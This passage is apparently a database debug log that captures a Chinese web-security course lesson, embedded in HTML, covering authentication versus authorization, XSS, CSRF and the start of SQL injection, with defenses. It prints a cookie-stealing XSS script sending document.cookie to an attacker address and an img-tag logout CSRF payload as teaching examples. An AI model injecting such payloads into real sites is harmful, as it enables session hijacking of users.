data-slate-leaf="true" data-offset-key="681:0" data-first-offset="true"><span data-slate-string="true">，国内很多个人站点的站长都对它深恶痛绝，比如你可以看看</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="682" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="683"><span data-slate-leaf="true" data-offset-key="683:0" 
data-first-offset="true"><span data-slate-string="true">这篇记录</span></span></span></a><span 
data-slate-object="text" data-key="684"><span data-slate-leaf="true" data-offset-key="684:0" 
data-first-offset="true"><span data-slate-string="true">，还有关于历史上五个最著名的 DDoS 攻击请参阅</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="685" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="686"><span data-slate-leaf="true" data-offset-key="686:0" 
data-first-offset="true"><span data-slate-string="true">这篇文章</span></span></span></a><span 
data-slate-object="text" data-key="687"><span data-slate-leaf="true" data-offset-key="687:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> </div> 
<div class="se-68ff1455" data-slate-type="image" data-slate-object="block" data-key="688"> 
<img class="se-d37f13c3" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 15, 15) 
 {executed in 1 msec}
2020-11-19 11:08:37.066 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=15 
 {executed in 0 msec}
2020-11-19 11:08:37.067 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:08:37.070 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="440" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-0a2b5403 " data-slate-type="paragraph" data-slate-object="block" data-key="441"> 
<span data-slate-object="text" data-key="442"><span data-slate-leaf="true" data-offset-key="442:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-33e2a9ff " data-slate-type="paragraph" data-slate-object="block" data-key="443"> 
<span data-slate-object="text" data-key="444"><span data-slate-leaf="true" data-offset-key="444:0" 
data-first-offset="true"><span data-slate-string="true">今天，我们来学习一些网站安全的基础知识。作为一名 Web 全栈工程师，不可避免地会经常性地面对网站安全的问题，因此有关安全的学习是十分必要的。这一讲我们就来看一些常见的安全问题，并了解它们相应的解决办法，加强安全意识。</span></span></span> 
</div> <h2 class="se-77866a69" data-slate-type="heading" data-slate-object="block" data-key="445"><span 
data-slate-object="text" data-key="446"><span data-slate-leaf="true" data-offset-key="446:0" 
data-first-offset="true"><span data-slate-string="true">鉴权和授权</span></span></span></h2> <div 
class="se-4e5caecc " data-slate-type="paragraph" data-slate-object="block" data-key="447"> 
<span data-slate-object="text" data-key="448"><span data-slate-leaf="true" data-offset-key="448:0" 
data-first-offset="true"><span data-slate-string="true">我把这两个概念的比较放在开头，是因为这两个概念有相关性且很常用，还有就是这二者太容易被混用了，但是实际上，它们却又是大不相同的。</span></span></span><span 
data-slate-object="text" data-key="449"><span data-slate-leaf="true" data-offset-key="449:0" 
data-first-offset="true"><span class="se-40b0136a" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">鉴权，Authentication，指的是对于用户身份的鉴别；而授权，Authorization，指的是允许对于特定资源的指定操作。</span></span></span></span> 
</div> <div class="se-311686b6 " data-slate-type="paragraph" data-slate-object="block" data-key="450"> 
<span data-slate-object="text" data-key="451"><span data-slate-leaf="true" data-offset-key="451:0" 
data-first-offset="true"><span data-slate-string="true">我们可以借助具体的例子来深入了解。</span></span></span> 
</div> <div class="se-cc26967d " data-slate-type="paragraph" data-slate-object="block" data-key="452"> 
<span data-slate-object="text" data-key="453"><span data-slate-leaf="true" data-offset-key="453:0" 
data-first-offset="true"><span data-slate-string="true">先说说鉴权。网站的登录系统，输入正确的用户名和密码以便登陆，这个过程就是一个鉴权参与的过程。输入了正确的用户名和密码，系统就能够确认用户的身份，鉴权也就成功了。再比如我们在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="454" class="se-d795ea91 
se-eb2c7cbb"><span data-slate-object="text" data-key="455"><span data-slate-leaf="true" data-offset-key="455:0" 
data-first-offset="true"><span data-slate-string="true">[第 02 讲]</span></span></span></a><span 
data-slate-object="text" data-key="456"><span data-slate-leaf="true" data-offset-key="456:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的 HTTPS 通信，其中的密钥也是起到了“鉴别身份”的作用，这个起作用的过程也属于鉴权。</span></span></span> 
</div> <div class="se-1fd631af " data-slate-type="paragraph" data-slate-object="block" data-key="457"> 
<span data-slate-object="text" data-key="458"><span data-slate-leaf="true" data-offset-key="458:0" 
data-first-offset="true"><span class="se-10dd71b9" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">为了安全考虑，在实际应用中鉴权有时不是靠“单因子”（Single-Factor）就够了的，我们还会采用“多因子”（Multi-Factor）的方式。</span></span></span></span> 
</div> <div class="se-c6dea544 " data-slate-type="paragraph" data-slate-object="block" data-key="459"> 
<span data-slate-object="text" data-key="460"><span data-slate-leaf="true" data-offset-key="460:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，银行转账的时候，你光输入账号和转账密码，这是属于单因子，一般是不够的，还必须有其它的因子，比如说 
U 盾等等。多个因子之间一般要求是独立的，无依赖关系。再比如说，你通过电话去办理通讯业务的时候，有时候为了证明你的身份，你会被要求提供 PIN 或者密码以外的其他“个人信息”，像是说出最近三次通话的电话号码，这些方式，都是为了增加“鉴权因子”的种类，从而提高安全级别。</span></span></span> 
</div> <div class="se-2acb2df5 " data-slate-type="paragraph" data-slate-object="block" data-key="461"> 
<span data-slate-object="text" data-key="462"><span data-slate-leaf="true" data-offset-key="462:0" 
data-first-offset="true"><span data-slate-string="true">再来举个授权的例子。还记得我们在 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="463" class="se-d795ea91 se-eb2c7cbb"><span 
data-slate-object="text" data-key="464"><span data-slate-leaf="true" data-offset-key="464:0" 
data-first-offset="true"><span data-slate-string="true">[第 04 讲]</span></span></span></a><span 
data-slate-object="text" data-key="465"><span data-slate-leaf="true" data-offset-key="465:0" 
data-first-offset="true"><span data-slate-string="true"> 中介绍的“资源”吗？对于不同的资源，不同的用户拥有不同的权限，而授权根据权限配置，确定用户对特定的资源是否能执行特定的行为。比如说，我们提到过的图书馆系统，授权确定用户是否能够查看图书信息，是否能够修改图书信息等等。</span></span></span> 
</div> <div class="se-7f30a2c1" data-slate-type="image" data-slate-object="block" data-key="466"> 
<img class="se-805486dc" src="https://static001.geekbang.org/resource/image/90/c2/90f7cb6ebb001eb3fcccaf19091bbec2.png"> 
</div> <h2 class="se-d7f4e6ec" data-slate-type="heading" data-slate-object="block" data-key="467"><span 
data-slate-object="text" data-key="468"><span data-slate-leaf="true" data-offset-key="468:0" 
data-first-offset="true"><span data-slate-string="true">常见的 Web 攻击方式</span></span></span></h2> 
<div class="se-32d1475b " data-slate-type="paragraph" data-slate-object="block" data-key="469"> 
<span data-slate-object="text" data-key="470"><span data-slate-leaf="true" data-offset-key="470:0" 
data-first-offset="true"><span data-slate-string="true">好，我想你已经理解了鉴权和授权的含义与区别。下面我就来介绍几种常见的 
Web 安全问题，在这部分的学习过程中，你可以联想一下在你经历过的项目，是否具备相同的安全隐患？</span></span></span> </div> <h3 class="se-44528791" 
data-slate-type="heading" data-slate-object="block" data-key="471"><span data-slate-object="text" 
data-key="472"><span data-slate-leaf="true" data-offset-key="472:0" data-first-offset="true"><span 
data-slate-string="true">1. XSS</span></span></span></h3> <div class="se-1f894700 " data-slate-type="paragraph" 
data-slate-object="block" data-key="473"> <span data-slate-object="text" data-key="474"><span 
data-slate-leaf="true" data-offset-key="474:0" data-first-offset="true"><span data-slate-string="true">XSS，Cross 
Site Script，跨站脚本攻击。原理是攻击者通过某种方式在网页上嵌入脚本代码，这样，正当用户在浏览网页或执行操作的时候，脚本被执行，就会触发攻击者预期的“不正当”行为。</span></span></span> 
</div> <div class="se-330ebb0e " data-slate-type="paragraph" data-slate-object="block" data-key="475"> 
<span data-slate-object="text" data-key="476"><span data-slate-leaf="true" data-offset-key="476:0" 
data-first-offset="true"><span data-slate-string="true">举个例子。在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="477" class="se-d795ea91 se-eb2c7cbb"><span data-slate-object="text" 
data-key="478"><span data-slate-leaf="true" data-offset-key="478:0" data-first-offset="true"><span 
data-slate-string="true">[第 29 讲]</span></span></span></a><span data-slate-object="text" data-key="479"><span 
data-slate-leaf="true" data-offset-key="479:0" data-first-offset="true"><span data-slate-string="true"> 
中我介绍了会话的原理，服务端给用户分配了一个标识身份的字符串，整个会话生命周期内有效，保存在浏览器的 Cookie 中（如果你忘记了，请回看）。</span></span></span> 
</div> <div class="se-aa830d25 " data-slate-type="paragraph" data-slate-object="block" data-key="480"> 
<span data-slate-object="text" data-key="481"><span data-slate-leaf="true" data-offset-key="481:0" 
data-first-offset="true"><span data-slate-string="true">现在，攻击者在服务器返回的普通页面中嵌入特殊的脚本代码，那么在普通用户浏览这个网页的时候，这个特殊的脚本代码就得到了执行，于是用户的 
Cookie 通过请求的方式发送给了这个攻击者指定的地址，这样攻击者就劫持了用户的会话，利用 Cookie 中标识身份的字符串，就可以伪装成实际的用户，来做各种坏事了。这个过程见下图：</span></span></span> 
</div> <div class="se-879995d6" data-slate-type="image" data-slate-object="block" data-key="482"> 
<img class="se-89bb26f1" src="https://static001.geekbang.org/resource/image/e9/ce/e9a926d5164fb90ac617b723c68529ce.jpg"> 
</div> <div class="se-1a9f61b4 " data-slate-type="paragraph" data-slate-object="block" data-key="483"> 
<span data-slate-object="text" data-key="484"><span data-slate-leaf="true" data-offset-key="484:0" 
data-first-offset="true"><span data-slate-string="true">你可能会想了，那在服务器端严格控制，不让用户上传脚本不就得了？</span></span></span> 
</div> <div class="se-ec432e70 " data-slate-type="paragraph" data-slate-object="block" data-key="485"> 
<span data-slate-object="text" data-key="486"><span data-slate-leaf="true" data-offset-key="486:0" 
data-first-offset="true"><span data-slate-string="true">可是，</span></span></span><span data-slate-object="text" 
data-key="487"><span data-slate-leaf="true" data-offset-key="487:0" data-first-offset="true"><span 
class="se-565c9b93" data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">这个恶意脚本的上传，往往是通过“正常”的页面访问来进行的，因此这个控制方法很容易疏漏。</span></span></span></span><span 
data-slate-object="text" data-key="488"><span data-slate-leaf="true" data-offset-key="488:0" 
data-first-offset="true"><span data-slate-string="true">比如给正常页面的请求添加特殊的参数，或者是提交信息表单的时候，构造一些特殊值。它们是利用网站的漏洞来做文章的，像是缺乏对用户上传的数据进行字符转义，而直接将这样的上传数据显示到页面上。</span></span></span> 
</div> <div class="se-08fddd61 " data-slate-type="paragraph" data-slate-object="block" data-key="489"> 
<span data-slate-object="text" data-key="490"><span data-slate-leaf="true" data-offset-key="490:0" 
data-first-offset="true"><span data-slate-string="true">举个例子：用户可以在电商网站的产品页面提交对产品的评论，并且，这个评论会显示到产品页上。于是攻击者上传了这样一段产品评论：</span></span></span> 
</div> <div class="se-d627538a se-03ba1a9a" data-slate-type="pre" data-slate-object="block" 
data-key="491" data-code-language="javascript"> <div class="se-edfb3e29 se-911a900a"> <span></span> 
</div> <div class="se-1320bc5f"> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="1"></div> 
<div class="se-6f69fcf3 se-e08c2035" data-code-line-number="2"></div> <div class="se-6f69fcf3 
se-e08c2035" data-code-line-number="3"></div> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="4"></div> 
<div class="se-6f69fcf3 se-e08c2035" data-code-line-number="5"></div> <div class="se-6f69fcf3 
se-e08c2035" data-code-line-number="6"></div> <div class="se-6f69fcf3 se-e08c2035" data-code-line-number="7"></div> 
</div> <div class="se-17b8c013 ps ps--active-x"> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" 
data-slate-object="block" data-key="492"> <span data-slate-object="text" data-key="493"><span 
data-slate-leaf="true" data-offset-key="493:0" data-first-offset="true"><span data-slate-string="true">评论内容上半部分</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="494"> <span data-slate-object="text" data-key="495"><span data-slate-leaf="true" 
data-offset-key="495:0" data-first-offset="true"><span data-slate-string="true">&lt;script&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="496"> <span data-slate-object="text" data-key="497"><span data-slate-leaf="true" 
data-offset-key="497:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="497:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1489351644" data-annotation-type="annotation"><span data-slate-string="true">var</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:2"><span data-slate-string="true"> script =</span></span><span 
data-slate-leaf="true" data-offset-key="497:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_0600045154" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:4"><span data-slate-string="true">.createElement(</span></span><span 
data-slate-leaf="true" data-offset-key="497:5"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_6900053875" data-annotation-type="annotation"><span data-slate-string="true">''script''</span></span></span><span 
data-slate-leaf="true" data-offset-key="497:6"><span data-slate-string="true">);</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="498"> <span data-slate-object="text" data-key="499"><span data-slate-leaf="true" 
data-offset-key="499:0" data-first-offset="true"><span data-slate-string="true"> script.src=</span></span><span 
data-slate-leaf="true" data-offset-key="499:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_1682325389" data-annotation-type="annotation"><span data-slate-string="true">''http://...?cookie=''</span></span></span><span 
data-slate-leaf="true" data-offset-key="499:2"><span data-slate-string="true"> + </span></span><span 
data-slate-leaf="true" data-offset-key="499:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_9959804411" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="499:4"><span data-slate-string="true">.cookie;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="500"> <span data-slate-object="text" data-key="501"><span data-slate-leaf="true" 
data-offset-key="501:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="501:1"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_3188838340" data-annotation-type="annotation"><span data-slate-string="true">document</span></span></span><span 
data-slate-leaf="true" data-offset-key="501:2"><span data-slate-string="true">.body.appendChild(script);</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="502"> <span data-slate-object="text" data-key="503"><span data-slate-leaf="true" 
data-offset-key="503:0" data-first-offset="true"><span data-slate-string="true">&lt;/script&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="504"> <span data-slate-object="text" data-key="505"><span data-slate-leaf="true" 
data-offset-key="505:0" data-first-offset="true"><span data-slate-string="true">评论内容下半部分</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 328px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-05ba1af3 " data-slate-type="paragraph" data-slate-object="block" 
data-key="506"> <span data-slate-object="text" data-key="507"><span data-slate-leaf="true" 
data-offset-key="507:0" data-first-offset="true"><span data-slate-string="true">如果这个电商网站没有对用户上传的评论做转义或者字符过滤，那么这个评论在展示的时候会显示“评论内容上半部分”和“评论内容下半部分”，中间的 
script 标签没有任何显示，但其中的脚本却被偷偷摸摸地执行了。</span></span></span> </div> <div class="se-65e62454" data-slate-type="list" 
data-slate-object="block" data-key="508"> <div class="se-9b195ab1 se-ad5f518d" data-slate-type="list-line" 
data-slate-object="block" data-key="509"> <span data-slate-object="text" data-key="510"><span 
data-slate-leaf="true" data-offset-key="510:0" data-first-offset="true"><span data-slate-string="true">浏览器构造了一个新的 
script 节点，并将其 src 属性指向攻击者指定的服务器地址，并将当前页面的 Cookie 放在其参数内。</span></span></span> </div> <div class="se-dfc2f721 
se-440f96fc" data-slate-type="list-line" data-slate-object="block" data-key="511"> <span data-slate-object="text" 
data-key="512"><span data-slate-leaf="true" data-offset-key="512:0" data-first-offset="true"><span 
data-slate-string="true">接着，再将这个新的 script 节点添加到 HTML 页面的 body 标签内。</span></span></span> </div> 
<div class="se-d1fddc89 se-43c0ea76" data-slate-type="list-line" data-slate-object="block" 
data-key="513"> <span data-slate-object="text" data-key="514"><span data-slate-leaf="true" 
data-offset-key="514:0" data-first-offset="true"><span data-slate-string="true">于是，浏览器就会向这个 
src 的地址发送一个带有当前 Cookie 的请求。</span></span></span> </div> </div> <div class="se-ad432fbe " data-slate-type="paragraph" 
data-slate-object="block" data-key="515"> <span data-slate-object="text" data-key="516"><span 
data-slate-leaf="true" data-offset-key="516:0" data-first-offset="true"><span data-slate-string="true">于是攻击者就可以获得用户浏览器内的会话标识串，从而劫持用户的会话了，例如可以仿冒用户的身份购物并寄往指定地址。</span></span></span> 
</div> <div class="se-0592d494 " data-slate-type="paragraph" data-slate-object="block" data-key="517"> 
<span data-slate-object="text" data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" 
data-first-offset="true"><span data-slate-string="true">知道了原理，我们就可以针对 XSS 的特点来进行防御，比如有这样两个思路：</span></span></span> 
</div> <div class="se-358eddfc" data-slate-type="list" data-slate-object="block" data-key="519"> 
<div class="se-9acabbd6 se-364601ea" data-slate-type="list-line" data-slate-object="block" 
data-key="520"> <span data-slate-object="text" data-key="521"><span data-slate-leaf="true" 
data-offset-key="521:0" data-first-offset="true"><span data-slate-string="true">第一个，做好字符转义和过滤，让用户上传的文本在展示的时候永远只是文本，而不可能变成 
HTML 和脚本。</span></span></span> </div> <div class="se-232eaf15 se-4feb97de" data-slate-type="list-line" 
data-slate-object="block" data-key="522"> <span data-slate-object="text" data-key="523"><span 
data-slate-leaf="true" data-offset-key="523:0" data-first-offset="true"><span data-slate-string="true">第二个，控制好 
Cookie 的作用范围。比如服务器在返回 Set-Cookie 头的时候，设置 HttpOnly 这个标识，这样浏览器的脚本就无法获得 Cookie 了，而用户却依然可以继续使用 
Cookie 和会话。</span></span></span> </div> </div> <div class="se-b4aab18e " data-slate-type="paragraph" 
data-slate-object="block" data-key="524"> <span data-slate-object="text" data-key="525"><span 
data-slate-leaf="true" data-offset-key="525:0" data-first-offset="true"><span data-slate-string="true">当然上述内容只是 
XSS 原理的一个简单示意，实际的跨站脚本攻击会比这个复杂且隐蔽得多。而且，这个跨站脚本可不只是能偷偷摸摸地把用户的 Cookie 传给攻击者，还能做其它的事情，比如我下面将要介绍的 
CSRF。</span></span></span> </div> <h3 class="se-94fb732a" data-slate-type="heading" data-slate-object="block" 
data-key="526"><span data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">2. CSRF</span></span></span></h3> <div 
class="se-3578ed23 " data-slate-type="paragraph" data-slate-object="block" data-key="528"> 
<span data-slate-object="text" data-key="529"><span data-slate-leaf="true" data-offset-key="529:0" 
data-first-offset="true"><span data-slate-string="true">CSRF，Cross-Site Request Forgery，跨站请求伪造，它指的是攻击者让用户进行非其本意的操作。CSRF 
和 XSS 的最大区别在于，</span></span></span><span data-slate-object="text" data-key="530"><span data-slate-leaf="true" 
data-offset-key="530:0" data-first-offset="true"><span class="se-d601cd0d" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">在 CSRF 的情况下，用户的“非其本意”的行为全部都是从受害用户的浏览器上发生的，而不是从攻击者的浏览器上挟持用户会话以后发起的。</span></span></span></span> 
</div> <div class="se-64f08c22 " data-slate-type="paragraph" data-slate-object="block" data-key="531"> 
<span data-slate-object="text" data-key="532"><span data-slate-leaf="true" data-offset-key="532:0" 
data-first-offset="true"><span data-slate-string="true">在讲 XSS 的时候我讲到了，如果使用 HttpOnly 方式的话，攻击者就无法获得用户的 
Cookie，因此之前例子所介绍的 XSS 就很难发生。但 CSRF 没有这个限制，它可以在不拿到用户 Cookie 的情况下进行攻击，也就是说，从这个角度上看，它更难以防范。</span></span></span> 
</div> <div class="se-2cd164ba " data-slate-type="paragraph" data-slate-object="block" data-key="533"> 
<span data-slate-object="text" data-key="534"><span data-slate-leaf="true" data-offset-key="534:0" 
data-first-offset="true"><span data-slate-string="true">我们还是接着 XSS 中攻击脚本的例子，如果这段脚本不是将用户的 Cookie 
上传，而是直接提交购物下单的 HTTP 请求，并寄往指定地址，那它和 XSS 中的那个例子比较起来看，后果是一样的。因此，从这个角度看，技术变了，从 XSS 变成了 CSRF，可危害程度并没有减轻。这个过程见下图：</span></span></span> 
</div> <div class="se-89e17553" data-slate-type="image" data-slate-object="block" data-key="535"> 
<img class="se-d1d9c8a1" src="https://static001.geekbang.org/resource/image/2b/2c/2baca2397b71c9d92c8d294ff9e1882c.jpg"> 
</div> <div class="se-432a7acb " data-slate-type="paragraph" data-slate-object="block" data-key="536"> 
<span data-slate-object="text" data-key="537"><span data-slate-leaf="true" data-offset-key="537:0" 
data-first-offset="true"><span data-slate-string="true">值得一提的是，有时候这个请求伪造，不一定要通过 JavaScript 
的脚本完成，比如依然是那个电商网站的例子，用户可以发布评论，并且这个评论的录入缺乏字符转义和过滤。现在我们把评论内容改成如下的样子：</span></span></span> </div> 
<div class="se-435d313a se-1c79057e" data-slate-type="pre" data-slate-object="block" data-key="538" 
data-code-language="javascript"> <div class="se-658472b8 se-9f04c527"> <span></span> </div> 
<div class="se-84b123ff"> <div class="se-b1bd6c96 se-63d07e6c" data-code-line-number="1"></div> 
<div class="se-b1bd6c96 se-63d07e6c" data-code-line-number="2"></div> <div class="se-b1bd6c96 
se-63d07e6c" data-code-line-number="3"></div> </div> <div class="se-61ba5fe9 ps"> <div class="se-0efb589d 
se-39cfb103" data-slate-type="code-line" data-slate-object="block" data-key="539"> <span data-slate-object="text" 
data-key="540"><span data-slate-leaf="true" data-offset-key="540:0" data-first-offset="true"><span 
data-slate-string="true">评论内容 </span></span><span data-slate-leaf="true" data-offset-key="540:1"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_9253095501" 
data-annotation-type="annotation"><span data-slate-string="true">1</span></span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="541"> <span data-slate-object="text" data-key="542"><span data-slate-leaf="true" 
data-offset-key="542:0" data-first-offset="true"><span data-slate-string="true">&lt;img src=</span></span><span 
data-slate-leaf="true" data-offset-key="542:1"><span class=" gkhl-string" data-slate-object="annotation" 
data-annotation-key="gkann_0938163374" data-annotation-type="annotation"><span data-slate-string="true">"/logout"</span></span></span><span 
data-slate-leaf="true" data-offset-key="542:2"><span data-slate-string="true">&gt;</span></span></span> 
</div> <div class="se-0efb589d se-39cfb103" data-slate-type="code-line" data-slate-object="block" 
data-key="543"> <span data-slate-object="text" data-key="544"><span data-slate-leaf="true" 
data-offset-key="544:0" data-first-offset="true"><span data-slate-string="true">评论内容 </span></span><span 
data-slate-leaf="true" data-offset-key="544:1"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_8705822892" data-annotation-type="annotation"><span data-slate-string="true">2</span></span></span></span> 
</div> <div class="ps__rail-x" style="left: 0px; bottom: 0px;"> <div class="ps__thumb-x" tabindex="0" 
style="left: 0px; width: 0px;"></div> </div> <div class="ps__rail-y" style="top: 0px; right: 
0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> </div> </div> 
</div> <div class="se-7ed0522e " data-slate-type="paragraph" data-slate-object="block" data-key="545"> 
<span data-slate-object="text" data-key="546"><span data-slate-leaf="true" data-offset-key="546:0" 
data-first-offset="true"><span data-slate-string="true">你看，原本中间的 script 脚本，变成了 img 标签，这个 img 
图像的 src 是一个相对路径，这里指向的是登出的 URI。于是每当用户访问这个评论展示的页面，浏览器就试图去发送 logout 请求来加载这张假的图片，于是用户就“莫名其妙”地自动登出了。这里攻击者使用了一个 
img 标签来发送这个登出的请求，而没有使用任何脚本。</span></span></span> </div> <div class="se-8ef15a3e " data-slate-type="paragraph" 
data-slate-object="block" data-key="547"> <span data-slate-object="text" data-key="548"><span 
data-slate-leaf="true" data-offset-key="548:0" data-first-offset="true"><span data-slate-string="true">在理解了原理之后，我们就可以制定一些应对策略了。除了和 
XSS 一样，做好字符的转义和过滤以外，针对 CSRF，我们还可以考虑如下应对策略：</span></span></span> </div> <div class="se-c76ac78a" 
data-slate-type="list" data-slate-object="block" data-key="549"> <div class="se-9f90217e se-88d573c0" 
data-slate-type="list-line" data-slate-object="block" data-key="550"> <span data-slate-object="text" 
data-key="551"><span data-slate-leaf="true" data-offset-key="551:0" data-first-offset="true"><span 
data-slate-string="true">第一种，使用 HTTP 的 Referer 头，因为 Referer 头可以携带请求的来源页面地址，这样可以根据 Referer 头鉴别出伪造的请求。</span></span></span> 
</div> <div class="se-0df29add se-1502d021" data-slate-type="list-line" data-slate-object="block" 
data-key="552"> <span data-slate-object="text" data-key="553"><span data-slate-leaf="true" 
data-offset-key="553:0" data-first-offset="true"><span data-slate-string="true">第二种，使用 token，原理上也很简单，服务端给每个表单都生成一个随机值，这个值叫做 
token。Token 和我们前面讲到的用来标识用户身份的 Cookie 所不同的是，前者是对每个页面或每个表单就会生成一个新的值，而后者则是只有会话重新生成的时候才会生成。当用户正常操作的时候，这个 
token 会被带上，从而证明用户操作的合法性，而如果是 CSRF 的情形，这个请求来自于一个非预期的位置，那么就不可能带有这个正确的 token。</span></span></span> 
</div> </div> <div class="se-7be384a1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="554"> <span data-slate-object="text" data-key="555"><span data-slate-leaf="true" 
data-offset-key="555:0" data-first-offset="true"><span class="se-8c2d89b7" data-slate-type="bold" 
data-slate-object="mark"><span data-slate-string="true">值得注意的是，CSRF 和 XSS 不是地位均等的，具体说，在防范 CSRF 
的情况下，必须首先确保没有 XSS 的问题，否则 CSRF 就会失去意义。</span></span></span></span><span data-slate-object="text" 
data-key="556"><span data-slate-leaf="true" data-offset-key="556:0" data-first-offset="true"><span 
data-slate-string="true">因为一旦用户的会话以 XSS 的方式被劫持，攻击者就可以在他自己的浏览器中假装被劫持用户而进行操作。由于攻击者在他自己的浏览器中遵循着正确的操作流程，因而这种情况下无论是 
Referer 头还是 token，从服务端的角度来看都是没有问题的，也就是说，当 XSS 被攻破，所有的 CSRF 的防御就失去了意义。</span></span></span> 
</div> <h3 class="se-0cccab0e" data-slate-type="heading" data-slate-object="block" data-key="557"><span 
data-slate-object="text" data-key="558"><span data-slate-leaf="true" data-offset-key="558:0" 
data-first-offset="true"><span data-slate-string="true">3. SQL 注入</span></span></span></h3> 
<div class="se-5d27433a " data-slate-type="paragraph" data-slate-object="block" data-key="559"> 
<span data-slate-object="text" data-key="560"><span data-slate-leaf="true" data-offset-key="560:0" 
data-first-offset="true"><span data-slate-string="true">SQL 注入，指的是攻击者利用网站漏洞，通过构造特殊的嵌入了 SQL 
命令的网站请求以欺骗服务器，并执行该恶意 SQL 命令。</span></span></span> </div> <div class="se-ab3e04b3 " data-slate-type="paragraph" 
data-slate-object="block" data-key="561"> <span data-slate-object="text" data-key="562"><span 
data-slate-leaf="true" data-offset-key="562:0" data-first-offset="true"><span data-slate-string="true">乍一听也许你会觉得这种方式在技术上可能比较难实现，和前面介绍的在用户的浏览器上做文章比起来，毕竟 
SQL 的执行是位于整个 Web 栈中较靠下的持久层，得“突破层层防守”才能抵达吧，可事实并非如此。</span></span></span> </div> <div class="se-4ebcb8c5 
" data-slate-type="paragraph" data-slate-object="block" data-key="563"> <span data-slate-object="text" 
data-key="564"><span data-slate-leaf="true" data-offset-key="564:0" data-first-offset="true"><span 
data-slate-string="true">SQL 注入原本可是很常见的，这些年由于持久层框架帮 Web 程序员做了很多 SQL 参数注入的事儿，程序员就很少自己去手动拼接 SQL 
了，SQL 注入的漏洞自然就少得多了，但是一旦出现，和 XSS 或 CSRF 比起来，由于不需要特定的用户访问指定的页面，攻击者可以独立完成入侵的过程，并且效果是可以执行 SQL，因而影响往往是巨大的。</span></span></span> 
</div> <div class="se-efad4b15 " data-slate-type="paragraph" data-slate-object="block" data-key="565"> 
<span data-slate-object="text" data-key="566"><span data-slate-leaf="true" data-offset-key="566:0" 
